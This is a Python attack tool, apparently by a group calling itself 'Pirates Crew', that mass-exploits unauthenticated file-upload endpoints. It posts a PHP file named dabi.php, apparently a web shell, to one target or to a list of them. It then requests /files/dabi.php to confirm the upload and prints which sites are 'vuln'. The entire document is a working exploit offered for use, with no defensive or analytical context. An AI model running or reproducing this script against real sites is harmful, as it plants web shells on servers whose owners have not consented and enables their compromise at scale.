import requests
import re
import sys, os, time

R = '\033[31m'   # Red
N = '\033[1;37m' # White
G = '\033[32m'   # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' # Blue
C = '\033[36m' # cyan

def anner():

	print ("""\033[32m
        > Pirates Crew <
  ┬┌─┐ ┬ ┬┌─┐┬─┐┬ ┬  ┌─┐┬  ┬ ┬┌─┐┬  ┌─┐┌─┐┌┬┐ 
  ││─┼┐│ │├┤ ├┬┘└┬┘  ├┤ │  │ │├─┘│  │ │├─┤ ││ __Author__ == Dabi
 └┘└─┘└└─┘└─┘┴└─ ┴   └  ┴─┘└─┘┴  ┴─┘└─┘┴ ┴─┴┘
 FA HAXOR - Rai Haxor - VandaTheGood

                                                                             """)
def pertanyaan():
	print ("""
 [1] Single Attack
 [2] Mass Attack
""")

class single:
	def __init__(self):
		'\033[1;37m'
		self.script = "dabi.php"
		self.tarjet = input(" [*] Target => \033[32m")
	def mampos(self):
		hihi = {'files[]':open(self.script, "rb")}
		ququq = requests.post(self.tarjet, allow_redirects=False, files=hihi)
		xixi = (self.tarjet+"/files/"+self.script)
		dono = requests.get(xixi).text
		if "DABI" in dono:
			print ("\033[1;37m %s \033[32m <-- vuln" % xixi)
		else:
			print ("\033[1;37m %s \033[0;33m <-- not vuln " % xixi)


class uvuvwevwevwe:
	def __init__(self):
		self.shell = 'dabi.php'
		self.url = input(" [*] List Target => ")
		print("")
	def betmen(self):
		oalah = open(self.url, 'r').readlines()
		haha = {'files[]':open(self.shell, "rb")}
		for sapulidi in oalah:
			try:
				yaw = sapulidi.strip()
				attack = requests.post(yaw, allow_redirects=False, files=haha)
				tempe = (yaw+"/files/"+self.shell)
				test = requests.get(tempe).text
				if "DABI" in test:
					print ("\033[1;37m {} \033[32m --> vuln" .format(tempe))
				else:
					print ("\033[1;37m {} \033[0;33m --> not vuln" .format(tempe))
					
			except requests.exceptions.ConnectionError:
				print("\033[1;37m {} \033[0;33m --> Connection Error" .format(tempe))

if __name__ == "__main__":
	os.system("clear")
	anner()
	pertanyaan()
	r = input("Choose ur Number => ")
	if r == '1':
		aser = single()
		aser.mampos()
	elif r == '2':
		carger = uvuvwevwevwe()
		carger.betmen()
		

